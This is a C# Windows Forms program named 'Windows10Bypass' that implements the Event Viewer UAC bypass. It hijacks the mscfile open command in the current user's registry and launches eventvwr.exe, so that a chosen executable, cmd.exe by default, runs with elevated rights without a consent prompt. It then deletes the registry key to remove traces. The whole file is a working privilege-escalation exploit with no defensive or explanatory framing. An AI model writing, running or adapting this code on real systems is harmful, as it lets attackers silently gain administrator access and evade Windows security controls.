using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows10Bypass
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            SetFileBypassUAC(textBox1.Text);
        }

        private async void SetFileBypassUAC(string fileLocation)
        {
            if (!System.IO.File.Exists(fileLocation)) return;

            string injectString = string.Format(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process -FilePath ""{0}"" -wait", fileLocation);
            using (RegistryKey regkey = Registry.CurrentUser)
            using (RegistryKey subkey = regkey.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command"))

            {
                subkey?.SetValue("", injectString, RegistryValueKind.String);
            }

            Process.Start("eventvwr.exe");

            await Wait(5000);

            //delete created subkeytree for mscfile
            Registry.CurrentUser.DeleteSubKeyTree(@"SOFTWARE\Classes\mscfile");
        }

        private async Task Wait(int time)
        {
            await Task.Delay(time);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
                ofd.FileName = "cmd.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    textBox1.Text = ofd.FileName;
                }
            }
        }
    }
}